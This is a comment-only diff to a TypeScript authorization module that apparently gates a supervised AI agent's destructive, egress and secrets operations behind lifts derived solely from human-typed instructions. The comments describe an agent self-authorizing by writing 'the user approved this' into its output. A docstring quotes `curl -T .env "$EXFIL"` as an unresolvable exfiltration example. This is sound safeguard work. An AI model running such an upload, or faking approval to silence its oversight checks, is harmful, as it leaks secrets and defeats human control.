@@ -1,11 +1,11 @@
 // bridge/src/handler/authorization.ts
 
-// Instruction-scoped authorization (§5.4). A lift is derived ONLY from the text a
+// Instruction-scoped authorization. A lift is derived ONLY from the text a
 // human typed into `handler:instruct` — the PA bar and the preset chips both funnel
 // through `HandlerEngine.instruct`, and that method is the single feed point. Never
 // the transcript, never judge/Assistant output: those are attacker-influenced, and an
 // agent that could authorize itself by writing "the user approved this" into its own
-// output would turn the advisory floor (§5.1) into decoration.
+// output would turn the advisory floor into decoration.
 //
 // Two grades, because "the user named this operation" and "the user named this
 // target" are different claims:
@@ -13,7 +13,7 @@
 //   literal lift — ABS_PATH and egress hosts, keyed by the exact string. Naming one
 //                  path outside the project must not open the filesystem; naming one
 //                  host must not open the network.
-// HARD (§5.3) is liftable by nothing at all.
+// HARD is liftable by nothing at all.
 
 import { classifyDestructive, isInsideProject, type FloorWarning } from "./destructive-floor";
 
@@ -28,7 +28,7 @@ export interface InstructionAuthorization {
 
 /**
  * The floor tiers a PATTERN lift can silence. ABS_PATH takes a literal lift
- * instead (`paths`), and §5.3 HARD takes none at all.
+ * instead (`paths`), and HARD takes none at all.
  */
 export type LiftedTier = "DESTRUCTIVE" | "EGRESS" | "SECRETS";
 
@@ -84,11 +84,12 @@ interface Alias {
 // from that scan alone would be dead code that still passes its own tests. This table
 // closes the gap for the floor operations a user routinely names in prose.
 //
-// That deliberately reaches past the operations §5.2 can prepare a snapshot for, to the
-// outward ones (a merge, a publish, a force branch delete) that nothing can. Without a
-// row here their advisory recurs every pass and buildDecidePrompt feeds it back as a
-// reason to escalate, so the merge the backlog exists to land never lands. A lift there
-// buys silence on the advisory and nothing else — never an undo, because none exists.
+// That deliberately reaches past the operations snapshot.ts can prepare a snapshot for,
+// to the outward ones (a merge, a publish, a force branch delete) that nothing can.
+// Without a row here their advisory recurs every pass and buildDecidePrompt feeds it
+// back as a reason to escalate, so the merge the backlog exists to land never lands. A
+// lift there buys silence on the advisory and nothing else — never an undo, because
+// none exists.
 //
 // It stays narrow and demands specific phrasing, because the two failure directions are
 // not symmetric: a MISSING lift costs one advisory row in the activity feed, while a
@@ -103,7 +104,7 @@ interface Alias {
 // product-development vocabulary: "add a hard reset button to the settings screen",
 // "add a force delete confirmation dialog", "recursively delete stale LRU entries".
 // None of those asks for anything to happen to the repo or the disk, and a lift
-// granted from one silently suppresses every §5.1 advisory row for the rest of the
+// granted from one silently suppresses every advisory row for the rest of the
 // session — the failure this table is least able to afford.
 const REPO_ANCHOR = String.raw`\b(?:git|repo|repository|branch|commit|HEAD|origin|upstream|working\s+tree)\b`;
 // No "cache" — "force remove the row from the cache" is in-memory prose, and the
@@ -323,7 +324,7 @@ export function authorizeInstruction(
   // Every grant below reads the PERMITTED clauses, never the raw text: a prohibition
   // names the same command a request does, and only the polarity tells them apart.
   const asked = grantableClauses(text);
-  // floor.hard is ignored, not consulted: §5.3 has no lift, so naming one of those
+  // floor.hard is ignored, not consulted: HARD has no lift, so naming one of those
   // commands in an instruction must leave no trace here.
   const floor = classifyDestructive(asked, projectPath);
   const operations: LiftedOperation[] = [];
@@ -394,9 +395,9 @@ function namesTargetOutsideProject(flaggedText: string, projectPath: string): bo
  *
  * The egress target claim fails CLOSED. An upload whose destination cannot be resolved
  * to a literal — `curl -T .env "$EXFIL"` — has named no host the user could have
- * authorized, so the operation lift does not stand on its own: §5.4 exists precisely so
- * that naming one host does not open the network, and an unparseable destination is the
- * one the user is least likely to have meant.
+ * authorized, so the operation lift does not stand on its own: the host lift is
+ * literal precisely so that naming one host does not open the network, and an
+ * unparseable destination is the one the user is least likely to have meant.
  */
 export function isAuthorized(
   auth: InstructionAuthorization, w: FloorWarning, flaggedText: string, projectPath: string,
@@ -424,8 +425,8 @@ export function isAuthorized(
 
 /**
  * Split rather than filter. An authorized action carries no warning — the user already
- * said to do it — but it is still snapshotted (§5.4), so the authorized list has to
- * survive the call site for the §5.2 snapshot pass to read.
+ * said to do it — but it is still snapshotted, so the authorized list has to
+ * survive the call site for the snapshot pass to read.
  */
 export function partitionWarnings(
   auth: InstructionAuthorization, warnings: FloorWarning[], flaggedText: string,
